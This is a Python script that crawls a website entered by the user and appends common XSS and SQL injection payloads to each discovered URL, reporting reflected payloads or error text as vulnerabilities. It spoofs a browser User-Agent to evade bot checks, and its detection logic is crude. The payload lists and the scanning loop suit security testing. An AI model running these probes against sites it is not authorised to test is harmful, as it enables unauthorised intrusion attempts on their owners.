import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin

# Headers to mimic a real browser and bypass some basic bot protections
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
}

# Common XSS payloads for testing
XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    '"><script>alert(1)</script>',
    "<img src=x onerror=alert(1)>"
]

# Common SQL Injection payloads
SQL_PAYLOADS = [
    "' OR 1=1 --",
    "' UNION SELECT NULL, NULL --",
    '" OR ""="',
    "' OR 'a'='a"
]


# Function to check for XSS vulnerabilities
def check_xss(url):
    for payload in XSS_PAYLOADS:
        try:
            test_url = url + payload
            response = requests.get(test_url, headers=HEADERS, timeout=10)
            if payload in response.text:
                print(f"[🔥] XSS vulnerability found on: {test_url}")
                return True
        except requests.exceptions.RequestException:
            pass
    return False


# Function to check for SQL injection vulnerabilities
def check_sql_injection(url):
    for payload in SQL_PAYLOADS:
        try:
            test_url = url + payload
            response = requests.get(test_url, headers=HEADERS, timeout=10)
            if "error" in response.text.lower() or "syntax" in response.text.lower():
                print(f"[💀] SQL Injection vulnerability found on: {test_url}")
                return True
        except requests.exceptions.RequestException:
            pass
    return False


# Function to get all links from the homepage
def get_links(domain):
    try:
        response = requests.get(domain, headers=HEADERS, timeout=10)
        soup = BeautifulSoup(response.text, 'html.parser')
        links = set()

        for a in soup.find_all('a', href=True):
            link = urljoin(domain, a['href'])
            if domain in link:  # Keep links within the domain
                links.add(link)

        return links

    except requests.exceptions.RequestException:
        print("[❌] Failed to fetch the homepage!")
        return []


# Function to scan a single URL
def scan_url(url, is_main_page=False):
    print(f"🔗 Checking: {url}")

    xss_found = check_xss(url)
    sql_found = check_sql_injection(url)

    if xss_found and sql_found:
        print(f"[⚠️] Both **XSS and SQL Injection** vulnerabilities found on: {url}\n")
    elif xss_found:
        print(f"[🚨] **XSS vulnerability** detected on: {url}\n")
    elif sql_found:
        print(f"[🚨] **SQL Injection vulnerability** detected on: {url}\n")
    elif is_main_page:
        print(f"[✅] No major vulnerabilities detected on the main page ({url})\n")
    else:
        print(f"[✅] No major vulnerabilities detected on {url}\n")


# Main function to scan the website
def scan_website(domain):
    print(f"🔍 Scanning {domain} for vulnerabilities...\n")

    # Step 1: Always test the original page first
    scan_url(domain, is_main_page=True)

    # Step 2: Get additional links
    links = get_links(domain)

    # Step 3: If no links were found, only scan the original page
    if not links:
        print("[⚠️] No additional links found, only scanned the main page.")
        return

    # Step 4: Scan all found links
    for link in links:
        scan_url(link)


# Entry point
if __name__ == "__main__":
    domain = input("Enter the website domain (e.g., https://example.com): ").strip()
    if not domain.startswith("http"):
        domain = "https://" + domain  # Ensure proper URL format
    
    scan_website(domain)
